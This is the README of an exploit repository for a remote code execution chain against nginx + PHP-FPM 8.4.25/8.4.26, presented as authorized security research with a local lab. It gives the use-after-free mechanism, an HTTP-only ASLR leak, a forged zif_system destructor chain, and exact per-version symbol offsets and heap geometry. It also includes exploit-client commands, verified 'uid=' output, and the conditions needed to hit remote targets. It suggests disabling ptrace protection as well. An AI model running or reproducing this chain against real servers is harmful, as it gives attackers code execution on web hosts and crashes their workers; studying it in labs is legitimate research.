# php2shell-nginx-fpm-full-rce

[![CI](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/ci.yml/badge.svg)](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/ci.yml)
[![Live FPM lab](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/live-fpm.yml/badge.svg)](https://github.com/VABISMO/php2shell-nginx-fpm-full-rce/actions/workflows/live-fpm.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![PHP](https://img.shields.io/badge/PHP-8.4.25%2F8.4.26-777bb4.svg)](https://www.php.net/)
[![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB.svg)](https://www.python.org/)

A self-contained **nginx + PHP-FPM RCE** laboratory and exploit client for the
cross-request `BG(unserialize)` stale-state chain in **PHP 8.4.25** and
**PHP 8.4.26**, fixed in **PHP 8.4.27**. This is the FPM-only extraction of
[`devploit/php2shell`](https://github.com/devploit/php2shell): no Apache code,
no Docker, no root.

> **Authorized security testing only.** Use this only on systems you own or
> have explicit written permission to test. The chain sends large bodies,
> triggers OOM conditions, and kills PHP-FPM workers. Run it against disposable
> local laboratories. See [LICENSE](LICENSE).

**Keywords:** PHP-FPM RCE, nginx PHP-FPM exploit, CVE-2026-109619, PHP 8.4.25,
PHP 8.4.26, PHP 8.4.27, session deserialization, `BG(unserialize)`, stale pointer,
use-after-free, ASLR bypass, HTTP-only leak, no-oracle, `zif_system`, FastCGI,
nginx security research, PHP session upload progress, exploitation laboratory.

## Table of contents

- [What this is](#what-this-is)
- [Affected builds](#affected-builds)
- [How the chain works](#how-the-chain-works)
- [Repository layout](#repository-layout)
- [Requirements](#requirements)
- [Quick start](#quick-start)
- [Exploit modes](#exploit-modes)
- [Verified output](#verified-output)
- [Laboratory details](#laboratory-details)
- [Profile and offsets](#profile-and-offsets)
- [HTTP-only base leak](#http-only-base-leak)
- [Testing](#testing)
- [CI/CD](#cicd)
- [Troubleshooting](#troubleshooting)
- [Security model, remote scope, and limitations](#security-model-remote-scope-and-limitations)
- [FAQ](#faq)
- [Legal and responsible use](#legal-and-responsible-use)
- [Credits](#credits)

## What this is

This repository contains:

- a Python client for the PHP-FPM session/unserialize stale-state chain;
- a reproducible user-prefix nginx + PHP-FPM laboratory (8.4.25/8.4.26
  vulnerable and 8.4.27 fixed) that runs without root or Docker;
- an HTTP-only leak that recovers the Zend-MM chunk and php-fpm PIE bases from
  a stale session string, removing `/proc/<pid>/mem` from the exploit path;
- a two-slot, self-correcting endgame that forges a `zend_reference` →
  `HashTable` → `zif_system` destructor chain;
- unit tests, profile validation, live lab tests, and GitHub Actions CI.

The target needs an **application operation** that calls `session_start()` and
reflects session values. The included `lab/fpm/webroot/app.php` is that
stand-in. This is not a generic scanner and does not magically exploit every
PHP-FPM deployment: the builder endpoint, session storage, and application
operation must match the model.

## Affected builds

| Item | Value |
| --- | --- |
| Vulnerable builds | PHP 8.4.25 and 8.4.26, amd64, nginx + PHP-FPM |
| Fixed build | PHP 8.4.27 (`PHP_RINIT(basic)` clears the stale state) |
| SAPI | `fpm` only |
| Profiles | `profiles/8.4.25-fpm.json`, `profiles/8.4.26-fpm.json` |
| Runtime proof | `uid=1000(...)` from `id` in the FPM worker |
| Worker impact | one consumer worker aborts after the command; FPM respawns it |
| Expected HTTP result | `502` after the fire; the proof file is the reliable signal |

The verified profiles are Debian-style, user-prefix PHP 8.4.25/8.4.26 builds.
Another distribution, architecture, or patch level needs its own offsets.

## How the chain works

The chain abuses a cross-request stale `php_unserialize_data` state left in
`BG(unserialize)` after an out-of-memory bailout. The short version:

```text
producer request
  GET /app.php with a large session
  -> session_start() decodes the session after RINIT
  -> 4 MB value triggers OOM
  -> php_execute_script catches the bailout; worker survives
  -> BG(unserialize) keeps {level=1, data=d}; d points at freed memory

consumer request
  POST multipart /app.php
  -> rfc1867 runs inside php_hash_environment(), before RINIT
  -> php_session_initialize() reuses stale d
  -> controlled 16 KB buffer reclaims d and forges var_hash
  -> R:2 resolves to a fake IS_REFERENCE
  -> fake HashTable's pDestructor = zif_system
  -> session shutdown calls zif_system(command)
  -> command runs, worker aborts, FPM respawns it
```

Detailed steps:

1. **Arm the stale state.** A post-RINIT OOM in `session_start()` must be
   caught by the request executor, not by FPM's fatal path. The producer uses
   the builder pool's large session file and the chain pool's `app.php`.
2. **Reclaim the stale struct.** The consumer is multipart because the rfc1867
   handler starts the session before `zend_activate_modules()` / RINIT. The
   reclaimed buffer is planted at the freed 8216-byte struct. A 16384-byte
   reclaim covers both known slots.
3. **Leak the absolute bases (optional but enabled by default).** A stale
   short-session string is pointed at a forged `zend_string` header. Its
   oversized length spans the stale zval array (chunk pointer) and an
   `execute_ex` handler pointer (PIE). The app reflects `r`, giving both bases
   over HTTP without `/proc/<pid>/mem`.
4. **Forge the destructor chain.** The forged memory contains a fake
   `zend_reference`, a fake `zend_array` with `pDestructor = zif_system`, an
   `execute_data` frame, and a fake `zend_string` holding the command.
5. **Fire at session shutdown.** `php_session_flush`, then
   `php_rshutdown_session_globals` → `zval_ptr_dtor` → reference destroy →
   fake array destroy → `zif_system`. `popen` runs the command; the worker
   aborts and FPM respawns it.

The useful mental model is: **post-RINIT OOM leaves a stale pointer; pre-RINIT
multipart session decode reclaims it; session shutdown gives the fake destructor
control of the worker.** The HTTP leak is separate: it turns the stale
short-session string into an OOB read primitive for ASLR bases.

## Repository layout

```text
.
├── .github/workflows/         CI, live-lab and release workflows
├── lab/fpm/
│   ├── build_php.sh           build PHP into lab/fpm/runtime (no root)
│   ├── build_nginx.sh         build nginx into lab/fpm/runtime (no root)
│   ├── nginx.conf.in          one nginx front for chain + builder pools
│   ├── php-fpm.conf.in        chain (8M) and builder (64M) pools
│   ├── php.ini                session/upload-progress lab configuration
│   └── webroot/
│       ├── app.php            session application operation / leak channel
│       ├── index.php          health check
│       ├── ref.php            creates `r` as a reference to `a`
│       ├── bigvar.php         large stale-session arm page
│       ├── leakvar.php        tunable stale-string research arm
│       └── refb.php           benign short-session builder
├── profiles/
│   ├── 8.4.25-fpm.json        verified offsets and heap geometry
│   ├── 8.4.26-fpm.json        verified offsets and heap geometry
│   └── schema.json            profile validator
├── tests/test_fpm.py          unit + opt-in live tests
├── tools/
│   ├── php2shell_fpm.py       exploit client
│   └── php2shell_fpm_labs.py  user-prefix nginx/FPM launcher
├── Makefile
├── requirements-dev.txt
└── pyproject.toml
```

## Requirements

- Linux **amd64** (the profile is verified on Debian-style builds).
- Python **3.11+**.
- `gcc`, `make`, `curl`, `tar` for the local source builds.
- nginx and PHP source tarballs are downloaded by the build scripts.
- No root, no Docker.
- Optional: `jsonschema` for profile validation, `ruff` for linting.
- The `endgame` oracle needs `kernel.yama.ptrace_scope=0`; `no-oracle` does not
  read process memory.

On Debian/Ubuntu, the build prerequisites are roughly:

```sh
sudo apt-get update
sudo apt-get install -y build-essential curl tar python3 python3-venv
```

Add `libxml2-dev` if your PHP configure step asks for libxml2 headers.

## Quick start

### 1. Build nginx and the vulnerable PHP

```sh
lab/fpm/build_nginx.sh
lab/fpm/build_php.sh 8.4.26
```

Both install under `lab/fpm/runtime/`, which is ignored by git. The PHP build is
a minimal `--disable-all --enable-cli --enable-fpm --enable-session` build.
Build 8.4.25 for the second verified vulnerable profile, or 8.4.27 for
`patchcheck`:

```sh
lab/fpm/build_php.sh 8.4.25
lab/fpm/build_php.sh 8.4.27
```

### 2. Start the lab

```sh
python3 tools/php2shell_fpm_labs.py up --only 8.4.26
# or: up --only 8.4.25,8.4.26
python3 tools/php2shell_fpm_labs.py status
python3 tools/php2shell_fpm_labs.py smoke
```

### 3. Run the HTTP-only exploit

```sh
python3 tools/php2shell_fpm.py \
  --base http://127.0.0.1:8110 \
  --builder http://127.0.0.1:8111 \
  --version 8.4.26 \
  --command 'id>out/p1' \
  --proof-file out/p1 \
  no-oracle
```

A successful run ends with a proof line and a consumer `status=502`. Fetch it:

```sh
curl http://127.0.0.1:8110/out/p1
```

### 4. Stop the lab

```sh
python3 tools/php2shell_fpm_labs.py down
```

## Exploit modes

| Command | Purpose | `/proc/<pid>/mem` | Notes |
| --- | --- | --- | --- |
| `leak` | Print chunk and PIE bases over HTTP | no | retries after worker death |
| `no-oracle` | Full RCE without process memory | no | HTTP leak; no `/proc` fallback by default |
| `endgame` | Oracle-calibrated full RCE | yes | local lab only |
| `primitive` | Benign forged `var_entries`, observable via `app.php` | yes | useful calibration test |
| `patchcheck` | Compare 8.4.26 and 8.4.27 | yes | proves the fixed build is clean |
| `chain` | Full pipeline (`primitive` or `endgame`) | yes | used by the lab runner |
| `lifecycle` | Worker-death matrix | no | lab diagnostics |
| `oracle` | Dump worker pid, bases, `d`, level | yes | lab diagnostics |
| `reclaim-probe` | Sweep pad sizes/geometry | yes | calibration |
| `build-oom` / `build-ref` | Build sessions directly | no | builder diagnostics |

Both `leak` and `no-oracle` accept `--chunk 0x...` and `--pie 0x...` overrides.
`no-oracle` fails if the HTTP leak fails; it does not touch local `/proc` unless
you explicitly add `--allow-local-fallback` (lab-only).

## Verified output

Reference run on the local 8.4.26 lab:

```text
$ python3 tools/php2shell_fpm.py --base http://127.0.0.1:8110 \
    --builder http://127.0.0.1:8111 --version 8.4.26 leak
[*] HTTP leak attempt 1: chunk=0x7f4f48800000 pie=0x55d75fc00000
[+] chunk=0x7f4f48800000 pie=0x55d75fc00000
```

```text
$ python3 tools/php2shell_fpm.py --base http://127.0.0.1:8110 \
    --builder http://127.0.0.1:8111 --version 8.4.26 \
    --command 'id>out/p1' --proof-file out/p1 no-oracle
[*] bases from HTTP stale-string leak: pie=0x55d75fc00000 chunk=0x7f4f48800000
[*] no-oracle: chunk=0x7f4f48800000 pie=0x55d75fc00000 zif=0x55d75ff86660
[*] consumer status=502
[*] attempt 0: d=0x7f4f48881000 k=0xfe8 status=502
[+] RCE proof via /out/p1: b'uid=1000(...) ...'
```

```text
$ curl http://127.0.0.1:8110/out/p1
uid=1000(cryptocalypse) gid=1000(cryptocalypse) groups=...
```

The same `leak`, `no-oracle`, `primitive`, and `endgame` commands work on the
8.4.25 profile at `:8130`/`:8131`; only the PIE base offset and reclaim pads
differ.

The `502` is expected: the worker dies after executing the command and FPM
respawns it. Do not treat `502` as a failed exploit; check the proof file.

## Laboratory details

The lab uses one nginx front and two PHP-FPM pools per build:

| Build | chain HTTP | builder HTTP | chain FPM | builder FPM |
| --- | --- | --- | --- | --- |
| 8.4.25 | :8130 | :8131 | :9021 | :9022 |
| 8.4.26 | :8110 | :8111 | :9001 | :9002 |
| 8.4.27 | :8120 | :8121 | :9011 | :9012 |

- **chain** — `memory_limit=8M`, `session.upload_progress.cleanup=On`,
  one static worker. This is the consumer/exploit target.
- **builder** — `memory_limit=64M`, `cleanup=Off`, one static worker. This
  builds the large session files and keeps them around for the next request.

Two endpoints are required: posting the 4 MB arm to the 8 MB chain pool would
kill the consumer worker before the fire.

All ports bind to `127.0.0.1`. The proof directory
`lab/fpm/webroot/out/` is served statically by nginx as `/out/`.

## Profile and offsets

`profiles/8.4.26-fpm.json` and `profiles/8.4.25-fpm.json` contain the verified
values:

| Field | 8.4.26 | 8.4.25 |
| --- | --- | --- |
| `zif_system` | `0x386660` | `0x386460` |
| `zval_ptr_dtor` | `0x54a0d0` | `0x549890` |
| `basic_globals` | `0xa04660` | `0xa04660` |
| `bg_unserialize_data_off` | `872` | `872` |
| `bg_unserialize_level_off` | `880` | `880` |
| `struct_size` | `8216` | `8216` |
| `reclaim_pads` | `[4096, 4096, 4096]` | `[4096, 4096]` |
| `reclaim_size` (oracle) | `12288` | `12288` |
| `reclaim_size` (no-oracle) | `16384` | `16384` |
| `no_oracle` candidates | `(0x81000, 0xfe8)`, `(0x82000, 0x1fe8)`, ... | `(0x7f000, 0xfe8)` |
| leak arm | `/bigvar.php` | `/bigvar.php` |
| leak pads | `[32768, 16384]` | `[32768, 16384]` |
| leak forged header | `0x17e8` content offset | `0x17e8` content offset |
| leak read length | `0x15810` | `0x15810` |
| chunk pointer offset | `0x77f8` | `0x77f8` |
| chunk base offset | `0x8b000` | `0x8b000` |
| PIE pointer offset | `0x157e8` | `0x157e8` |
| PIE base offset | `0x4ea787` | `0x4e9fc7` |

Validate the profile:

```sh
python3 -c "import glob, json, jsonschema; \
  s = json.load(open('profiles/schema.json')); \
  [jsonschema.validate(json.load(open(p)), s) for p in glob.glob('profiles/*-fpm.json')]; \
  print('profiles valid')"
```

Another PHP build or distro needs a new profile with its own symbols, struct
size, heap geometry, and leak offsets. PHP 8.5.11 was evaluated but its
allocator layout did not reproduce the HTTP leak with this geometry, so it is
not shipped as a supported profile. The schema documents the expected shape.

## HTTP-only base leak

The leak is the part that removes the ASLR oracle from the exploit path:

1. `bigvar.php` stores `k0..k3` before a 4 MB tail, so the producer OOM leaves
   dangling zval pointers in the stale var_hash.
2. The producer is fired; the 4 MB tail triggers the OOM.
3. A later multipart request reclaims a freed 16 KB slot with a forged
   `zend_string` header. Its length (`0x15810`) spans the stale zval array
   (chunk pointer) and the `execute_ex` handler table (PIE pointer).
4. `app.php` reflects `r`; the client dechunks the body, extracts `r\t`, and
   reads the two pointers at fixed offsets.
5. The client validates alignment and expected address ranges, subtracts
   `0x8b000` for the chunk and `0x4ea787` for the PIE base, and retries if the
   worker answered late or died mid-read.

The read is retried because the worker can abort after answering. A failed leak
is not necessarily a broken lab; re-run `leak` or use `--chunk/--pie` if the
bases are known.

## Testing

### Unit tests

```sh
python3 -m unittest discover -s tests -v
```

The suite covers multipart encoding, chunked-body decoding, leak geometry,
profile consistency, schema validation, and the exact forged payload layout.
The live tests are skipped unless the lab is up and `PHP2SHELL_FPM_LAB=1` is
set.

### Live lab tests

```sh
PHP2SHELL_FPM_LAB=1 python3 -m unittest \
  tests.test_fpm.FpmLabIntegrationTests -v
```

This runs `primitive`, `endgame`, and `no-oracle` against
`127.0.0.1:8110/8111`. `endgame` needs `ptrace_scope=0`; `no-oracle` does not.

### Syntax and lint

```sh
python3 -m compileall -q tools tests
bash -n lab/fpm/build_php.sh lab/fpm/build_nginx.sh
ruff check tools tests
```

### Manual smoke test

```sh
python3 tools/php2shell_fpm_labs.py smoke
```

### Make targets

```sh
make test       # unit suite
make lint       # ruff
make validate   # profile against schema
make ci         # lint + test + validate
```

## CI/CD

GitHub Actions is configured in `.github/workflows/`:

- **`ci.yml`** — on every push and pull request:
  - Python 3.11, 3.12, and 3.13 matrix;
  - installs `requirements-dev.txt` (`jsonschema`, `ruff`);
  - runs `ruff check tools tests`;
  - compiles Python and checks shell syntax;
  - runs the unit suite with schema validation.
- **`live-fpm.yml`** — manual `workflow_dispatch`:
  - installs build dependencies;
  - builds nginx and PHP 8.4.26 from source (8.4.25 profile is unit-validated);
  - starts the local lab;
  - enables `ptrace_scope=0` for the oracle test;
  - runs the full live suite and tears the lab down.
- **`release.yml`** — on `v*` tags:
  - publishes a GitHub Release with generated release notes.

The live workflow is manual because a PHP source build is too heavy and too
environment-sensitive for every push. The fast CI validates the client,
profile, payload layout, and scripts without building PHP.

## Troubleshooting

### `consumer status=502` and no proof

`502` after the fire is normal: the worker was killed by the fake destructor.
Check the proof file (`curl http://127.0.0.1:8110/out/p1`). If it is missing,
look at `lab/fpm/runtime/php-8.4.26/logs/` and retry. A mismatch moves the
worker to the other heap slot and the next candidate.

### `HTTP leak failed (all reads short or invalid)`

The worker may have died between the leak read and the response, or the heap
layout may have shifted. Retry `leak`; the state is re-armed each run. If you
already know the bases, pass `--chunk` and `--pie`. For the local lab only,
`no-oracle --allow-local-fallback` permits the `/proc/<pid>/maps` fallback;
remote targets should retry or provide the bases.

### `no php-fpm 'chain' worker`

The lab is not running, or the worker died and has not respawned. Check
`python3 tools/php2shell_fpm_labs.py status`, then start or restart it.

### `ptrace_scope` or oracle errors

`endgame` and `primitive` use `/proc/<pid>/mem`. Set:

```sh
sudo sysctl -w kernel.yama.ptrace_scope=0
```

Use `no-oracle` if you do not want to change the setting.

### Ports already in use

```sh
python3 tools/php2shell_fpm_labs.py down
python3 tools/php2shell_fpm_labs.py up --only 8.4.26
```

### `command too long`

The fake `zend_string` carrier limits the command to **87 bytes** with no NUL.
Use a short command, or stage a longer script separately in an authorized lab.

### Missing build tools

`build_php.sh` and `build_nginx.sh` print the failing command. Install
`build-essential`, `curl`, and `tar`; add `libxml2-dev` if PHP configure asks
for it.

### Schema test skipped

Install the development dependency:

```sh
python3 -m pip install -r requirements-dev.txt
```

### `Primary script unknown` / nginx 404

The nginx root is the repository's `lab/fpm/webroot`. Re-run
`python3 tools/php2shell_fpm_labs.py up` so nginx and FPM configs are rendered
with the current paths. Do not move the webroot independently of the launcher.

## Security model, remote scope, and limitations

### What "100% remote" means here

The `no-oracle` path is **100% remote for the supported configuration below**:
every interaction with the target is an HTTP request to the chain and builder
surfaces. It does not read `/proc/<pid>/mem`, does not need a local shell or the
FPM PID, and executes the command in the target worker. The HTTP stale-string
leak recovers the ASLR bases.

If the HTTP leak fails, `no-oracle` stops; it does **not** silently read local
`/proc`. The `/proc/<pid>/maps` fallback is opt-in with
`--allow-local-fallback` and is only for the lab. On a remote target, retry the
leak or provide the bases with `--chunk/--pie`. This is remote code execution,
not a generic unauthenticated scanner.

### Configurations this PoC covers without code changes

- **PHP 8.4.25 or 8.4.26, amd64, nginx + PHP-FPM.** The verified offsets are in
  `profiles/8.4.25-fpm.json` and `profiles/8.4.26-fpm.json`. PHP 8.4.27 is fixed
  and is not covered. PHP 8.5.x needs a separate calibrated profile.
- **Default session serializer and storage:** `session.serialize_handler=php`
  and `session.save_handler=files`, with a writable session directory shared by
  the arm/builder and consumer surfaces.
- **Two HTTP surfaces with different memory limits:** a consumer pool low
  enough that decoding the 4 MB session OOMs after RINIT, and a builder
  surface high enough to persist the 4 MB arm. This can be two FPM pools on one
  host or two hosts sharing the session directory.
- **Single-worker pools, or reliable worker pinning.** The stale
  `BG(unserialize)` state lives in the worker that handled the producer
  request. With several workers and no pinning, the consumer request can land
  on a different worker. `pm.max_requests` must not recycle that worker between
  the arm and the fire.
- **An application operation that calls `session_start()`** and lets the
  session decode after RINIT. `lab/fpm/webroot/app.php` is the stand-in.
- **An arm operation equivalent to `bigvar.php`**: small session keys are
  pushed onto the unserialize var_hash before a 4 MB tail triggers the OOM.
  A generic session write that only stores one large value is not enough.
- **A reference-bearing session equivalent to `ref.php`**: the application can
  store a reference in the session, so the serialized session contains `R:N`;
  that is the hook the forged `var_hash` redirects.
- **A builder operation that writes and retains the 4 MB session**, for example
  `session.upload_progress.cleanup=Off` on the builder, or an application-level
  session write. `session.upload_progress.enabled=On` and body limits large
  enough for the 4 MB arm and 16 KB trigger are required.
- **`session.use_strict_mode=0`**, or an existing attacker-known session ID
  accepted by the application, and no session-ID regeneration between the arm
  and the fire. Strict mode or regeneration can break the chain before it
  starts.
- **A reflection/read channel for the leaked `r` value.** `app.php` provides
  it for the lab. Without it, `leak` cannot recover ASLR remotely; `no-oracle`
  then needs known `--chunk/--pie` values.
- **An HTTP-reachable proof path**, or another authorized exfiltration channel.
  `out/p1` and `/out/` are lab conveniences, not a requirement of the memory
  corruption itself. The command is limited to 87 bytes with no NUL.

### Configurations that need adaptation or do not work

- PHP 8.4.27, PHP 8.5.x, or another PHP version/architecture without a matching
  profile. The bug may still be relevant elsewhere, but this repository's
  offsets and heap geometry are only verified for 8.4.25/8.4.26 amd64.
- A single low-memory pool: the 4 MB arm kills the consumer before the trigger.
- Redis/Memcached/custom session handlers, `php_serialize`, or session storage
  that is not shared between the two surfaces.
- A single pool with many workers and no way to pin the producer and consumer
  to the same worker. The state is not shared between workers.
- No application session-start operation, no way to persist the arm, or no
  session reflection/read channel and unknown bases.
- Apache `mod_php`, CGI, CLI, or non-FPM SAPIs. This is an FPM chain.
- Interactive shells or persistence. The command is one-shot, the carrier is
  87 bytes, and the consumer worker aborts after `zif_system`; FPM respawns it.
  A `502` is the expected side effect.

### Operational limits

- **Authorized labs only.** The chain is destructive to workers and allocates
  large bodies. Do not point it at third-party infrastructure.
- **Leak reliability.** The OOB read can race worker death; the client retries.
  The bases remain stable for the FPM master lifetime.
- **Local oracle modes.** `endgame` and `primitive` read `/proc/<pid>/mem` and
  need `kernel.yama.ptrace_scope=0`; `no-oracle` does not.

This is a concrete, verified PoC, not a claim that every PHP-FPM 8.4.25/8.4.26
deployment is exploitable with no adaptation. The underlying bug may affect
more configurations than this client covers.

## FAQ

**Is this a remote pre-auth exploit?**<br>
It is 100% remote in the supported model: all target interaction is HTTP and
`no-oracle` does not read `/proc`. It is not pre-auth or universal: it requires
the application operations, two surfaces, and session configuration listed in
[Security model, remote scope, and limitations](#security-model-remote-scope-and-limitations).
The included lab is loopback-only.

**Why is the proof a `502`?**<br>
The command runs during session shutdown, then the fake destructor chain kills
the worker. The proof is the command's output file, not the HTTP status.

**Why two HTTP ports?**<br>
The 4 MB arm must go to the 64 MB builder pool. Sending it to the 8 MB consumer
pool kills the worker too early.

**Why no Docker?**<br>
The oracle needs host `/proc/<pid>/mem` and worker PIDs. Docker would require
`--pid=host` plus `SYS_PTRACE`, or running the client inside the container.
The user-prefix lab is simpler, rootless, and matches the upstream FPM lab.

**Does it work on PHP 8.4.27?**<br>
No. `PHP_RINIT(basic)` clears the stale state before the window; `patchcheck`
shows the fixed build as clean.

**Does it work on PHP 8.5.x?**<br>
Not with the shipped profiles. PHP 8.5.11 was evaluated during the 8.4.25
calibration; its allocator layout did not reproduce the HTTP leak with this
geometry, so only 8.4.25 and 8.4.26 are claimed as verified.

**Can I set the bases manually?**<br>
Yes:

```sh
python3 tools/php2shell_fpm.py ... --chunk 0x7f4f48800000 --pie 0x55d75fc00000 no-oracle
```

**Does the leak need `/proc`?**<br>
No. The default `leak`/`no-oracle` path is HTTP-only; `no-oracle` refuses the
local fallback unless you explicitly pass `--allow-local-fallback` (lab-only).

## Legal and responsible use

This is security research tooling. You may use it only when you own the target
or have explicit, written permission from its owner, and when your testing
complies with the law and any applicable program rules. A public website, an IP
address found online, or a domain that looks like a lab is **not**
authorization.

Do not use this repository to build target lists, mass-exploitation tooling, or
to attack third-party infrastructure. Do not publish data obtained from systems
you do not own. Prefer coordinated disclosure with the PHP security team and
the affected distribution vendor.

The software is provided **as is**, without warranty. See [LICENSE](LICENSE).

## Credits

Original research and the Apache/FPM chains:
[`devploit/php2shell`](https://github.com/devploit/php2shell). This repository
is the FPM-only extraction and laboratory. Licensed under MIT; see
[LICENSE](LICENSE).
